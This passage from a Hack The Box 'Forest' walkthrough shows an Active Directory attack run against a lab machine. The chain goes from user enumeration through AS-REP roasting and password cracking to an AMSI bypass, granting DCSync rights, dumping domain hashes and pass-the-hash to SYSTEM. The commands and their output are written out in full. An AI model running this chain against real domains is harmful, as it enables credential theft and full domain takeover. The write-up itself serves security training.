sAMAccountName: HealthMailboxc0a90c9
sAMAccountName: HealthMailbox670628e
sAMAccountName: HealthMailbox968e74d
sAMAccountName: HealthMailbox6ded678
sAMAccountName: HealthMailbox83d6781
sAMAccountName: HealthMailboxfd87238
sAMAccountName: HealthMailboxb01ac64
sAMAccountName: HealthMailbox7108a4e
sAMAccountName: HealthMailbox0659cc1
sAMAccountName: sebastien
sAMAccountName: lucinda
sAMAccountName: andy
sAMAccountName: mark
sAMAccountName: santi
</pre></table></code></div></div><p>Readings:<br /> <a href="https://www.tenable.com/plugins/nessus/10722">https://www.tenable.com/plugins/nessus/10722</a><br /> <a href="https://www.tenable.com/plugins/nessus/10723">https://www.tenable.com/plugins/nessus/10723</a><br /> <a href="https://tools.ietf.org/html/rfc4513#section-5.1.1">https://tools.ietf.org/html/rfc4513#section-5.1.1</a></p><h3 id="dns">DNS</h3><p>Play with the DNS:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>$ host htb.local 10.10.10.161
Using domain server:
Name: 10.10.10.161
Address: 10.10.10.161#53
Aliases: 

htb.local has address 10.10.10.161

$ host -t ns htb.local 10.10.10.161
Using domain server:
Name: 10.10.10.161
Address: 10.10.10.161#53
Aliases: 

htb.local name server forest.htb.local.

$ host forest.htb.local 10.10.10.161
Using domain server:
Name: 10.10.10.161
Address: 10.10.10.161#53
Aliases: 

forest.htb.local has address 10.10.10.161
</pre></table></code></div></div><p>Try zone transfer failed:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>$ host -t axfr htb.local 10.10.10.161
Trying "htb.local"
Using domain server:
Name: 10.10.10.161
Address: 10.10.10.161#53
Aliases: 

Host htb.local not found: 5(REFUSED)
; Transfer failed.
</pre></table></code></div></div><h3 id="smb">SMB</h3><p>Try listing shares with null session authentication failed:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>$ crackmapexec smb 10.10.10.161 -u '' -p '' --shares
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [-] htb.local\: STATUS_ACCESS_DENIED
</pre></table></code></div></div><h3 id="rpc">RPC</h3><p>Enumerate domain users with <code class="language-plaintext highlighter-rouge">rpcclient</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre>$ rpcclient -U '' -N 10.10.10.161                   
rpcclient $&gt; enum
enumalsgroups              enumdomains                enumdrivers                enumkey                    enumports                  enumprocdatatypes
enumdata                   enumdomgroups              enumforms                  enummonitors               enumprinters               enumprocs
enumdataex                 enumdomusers               enumjobs                   enumpermachineconnections  enumprivs                  enumtrust
rpcclient $&gt; enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
</pre></table></code></div></div><p>Note that the results are slightly different from what we get from <code class="language-plaintext highlighter-rouge">LDAP</code> previously.</p><h2 id="exploitation">Exploitation</h2><h3 id="as-rep-roasting">AS-REP Roasting</h3><p>AS-REP roasting is an attack that allows retrieving password hashes for users that do not require Kerberos preauthentication. For more details, refer to <a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">here</a>.</p><p>Get a list of users with <code class="language-plaintext highlighter-rouge">UF_DONT_REQUIRE_PREAUTH</code> set:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>$ impacket-GetNPUsers -dc-ip 10.10.10.161 htb.local/
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2021-02-21 05:15:28.644990  2021-02-21 04:34:44.843064  0x410200
</pre></table></code></div></div><p>Get a TGT for <code class="language-plaintext highlighter-rouge">svc-alfresco</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>$ impacket-GetNPUsers -dc-ip 10.10.10.161 htb.local/svc-alfresco -no-pass
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:d2cb9ef633c35eb1025358d77a74d1b8$05cf5d6351281f527192489ce06d152359abd444ad19d6d1aae9790ccf3d602ca00fbf4cc01117f10ccf4ccdd8544f3d32dbe95d9fe3c1503ff1c8a2ce685a37d006db803d7c705dd81207c5e7fed044fbbdbc971b3ce7e4d349b3e1a1bb13de05890337afb73c4faa4ad95cd59ba8ed755a722f4620e093d98ed33d3b34c0c67df0332cadadaa2f9be567bdede1adfe4c96ffbc18b4a96fc3d9f7a3d6f84ec34294916d1fa236350c49c836efb74be3c2720afcb2c2c56ae88c4eab298e5b6f39b5c841141e1de728895a9d32faecddf52694de2c0bb912dbb124e4b4ab0126fed452a2ea7e
</pre></table></code></div></div><p>After copying the hash to a file named <code class="language-plaintext highlighter-rouge">hash</code>, we can try to crack it with <code class="language-plaintext highlighter-rouge">john</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>$ john -w=/opt/rockyou.txt hash

...

s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
</pre></table></code></div></div><p>The crack is successful with the wordlist <code class="language-plaintext highlighter-rouge">rockyou.txt</code> and we get the password <code class="language-plaintext highlighter-rouge">s3rvice</code> for the account <code class="language-plaintext highlighter-rouge">svc-alfresco</code>. With the credentials, we get a shell via <code class="language-plaintext highlighter-rouge">Evil-WinRM</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice -n

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; whoami
htb\svc-alfresco
</pre></table></code></div></div><h2 id="privilege-escalation">Privilege Escalation</h2><p>To enumerate the domain and find PE vectors, we will use <code class="language-plaintext highlighter-rouge">BloodHound</code>. First, we use the <a href="https://github.com/fox-it/BloodHound.py">python based ingestor</a> to collect information.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c all
</pre></table></code></div></div><p>By doing this, we get a few <code class="language-plaintext highlighter-rouge">json</code> files. Next, we drop these files into <code class="language-plaintext highlighter-rouge">BloodHound</code>. After the data is processed, we query “Shortest Path from Owned Principals”, and “Shortest Paths to High Value Targets” respectively. From the first query we we can see that <code class="language-plaintext highlighter-rouge">svc-alfresco</code>, which is already owned by us, is eventually a member of “Account Operators”. This means that we can create users and add them to normal groups. Combining it with the second query, we find a PE path as the following: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-forest/bh1.jpg" alt="" /></p><p>This PE vector contais two main steps. In the first step, we will create an user and add it to the “Exchange Windows Permissions” group. We are able to do this because we are a member of the “Account Operators” group. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-forest/bh2.jpg" alt="" /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net user qt Password123! /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net group "Exchange Windows Permissions" qt /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net group "Exchange Windows Permissions" 
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
qt
The command completed successfully.
</pre></table></code></div></div><p>We also add this account to the “Remote Management Users” group so that we can login with <code class="language-plaintext highlighter-rouge">Evil-WinRM</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net localgroup "Remote Management Users" qt /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net localgroup "Remote Management Users" 
Alias name     Remote Management Users
Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

Members

-------------------------------------------------------------------------------
Privileged IT Accounts
qt
The command completed successfully.
</pre></table></code></div></div><p>In the second step, we will use <code class="language-plaintext highlighter-rouge">Add-ObjectACL</code> from <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> to grant us <code class="language-plaintext highlighter-rouge">DCSync</code> Privileges. We are able to do this because we are now in the “Exchange Windows Permissions” group. More details of this attack can be found <a href="http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/">here</a>. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-forest/bh3.jpg" alt="" /></p><p>Note that <code class="language-plaintext highlighter-rouge">Bypass-4MSI</code> is needed before loading <code class="language-plaintext highlighter-rouge">PowerView.ps1</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre>$ evil-winrm -i 10.10.10.161 -u qt -p Password123! -n -s $(pwd)

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\qt\Documents&gt; menu

   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/ 
              By: CyberVaca, OscarAkaElvis, Laox @Hackplayers  
 
[+] Bypass-4MSI 
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary

*Evil-WinRM* PS C:\Users\qt\Documents&gt; Bypass-4MSI
[+] Patched! :D
*Evil-WinRM* PS C:\Users\qt\Documents&gt; PowerView.ps1
*Evil-WinRM* PS C:\Users\qt\Documents&gt; $pass = convertto-securestring 'Password123!' -asplain -force
*Evil-WinRM* PS C:\Users\qt\Documents&gt; $cred = new-object system.management.automation.pscredential('HTB\qt', $pass)
*Evil-WinRM* PS C:\Users\qt\Documents&gt; add-objectacl -principalidentity qt -credential $cred -rights DCSync
</pre></table></code></div></div><p>Now that we have <code class="language-plaintext highlighter-rouge">DCSync</code> privileges, we can use <code class="language-plaintext highlighter-rouge">impacket-secretsdump</code> to dump NTLM hashes of all domain users.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>$ impacket-secretsdump htb.local/qt@10.10.10.161
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: 

...

</pre></table></code></div></div><p>With the hash of <code class="language-plaintext highlighter-rouge">Administrator</code>, we can pass-the-hash via <code class="language-plaintext highlighter-rouge">psexec</code> and get an escalated shell.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>$ impacket-psexec administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file StbHukQA.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service GpKO on 10.10.10.161.....
[*] Starting service GpKO.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
nt authority\system
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf-write-ups/'>CTF Write-ups</a>, <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/oscp-prep/" class="post-tag no-text-decoration" >OSCP Prep</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >Active Directory</a> <a href="/tags/bloodhound/" class="post-tag no-text-decoration" >BloodHound</a> <a href="/tags/evil-winrm/" class="post-tag no-text-decoration" >Evil-WinRM</a> <a href="/tags/impacket/" class="post-tag no-text-decoration" >Impacket</a> <a href="/tags/john-the-ripper/" class="post-tag no-text-decoration" >John the Ripper</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB - Forest - QTranspose&url=https://qtranspose.xyz/posts/htb-forest/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB - Forest - QTranspose&u=https://qtranspose.xyz/posts/htb-forest/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB - Forest - QTranspose&url=https://qtranspose.xyz/posts/htb-forest/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-bankrobber/">HTB - Bankrobber</a><li><a href="/posts/htb-bounty/">HTB - Bounty</a><li><a href="/posts/htb-forest/">HTB - Forest</a><li><a href="/posts/htb-optimum/">HTB - Optimum</a><li><a href="/posts/htb-bastard/">HTB - Bastard</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/oscp-prep/">OSCP Prep</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/metasploit/">Metasploit</a> <a class="post-tag" href="/tags/powershell/">PowerShell</a> <a class="post-tag" href="/tags/burp-suite/">Burp Suite</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/bloodhound/">BloodHound</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-blue/"><div class="card-body"> <span class="timeago small" > Nov 11, 2020 <i class="unloaded">2020-11-11T00:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Blue</h3><div class="text-muted small"><p> Blue is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-devel/"><div class="card-body"> <span class="timeago small" > Nov 15, 2020 <i class="unloaded">2020-11-15T00:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Devel</h3><div class="text-muted small"><p> Devel is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we...</p></div></div></a></div><div class="card"> <a href="/posts/htb-optimum/"><div class="card-body"> <span class="timeago small" > Nov 16, 2020 <i class="unloaded">2020-11-16T00:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Optimum</h3><div class="text-muted small"><p> Optimum is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-jerry/" class="btn btn-outline-primary" prompt="Older"><p>HTB - Jerry</p></a> <a href="/posts/htb-bankrobber/" class="btn btn-outline-primary" prompt="Newer"><p>HTB - Bankrobber</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"></div><div class="footer-right"><p class="mb-0"> © 2021 <a href="https://github.com/QTranspose">QTranspose</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">All rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/oscp-prep/">OSCP Prep</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/metasploit/">Metasploit</a> <a class="post-tag" href="/tags/powershell/">PowerShell</a> <a class="post-tag" href="/tags/burp-suite/">Burp Suite</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/bloodhound/">BloodHound</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://qtranspose.xyz{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
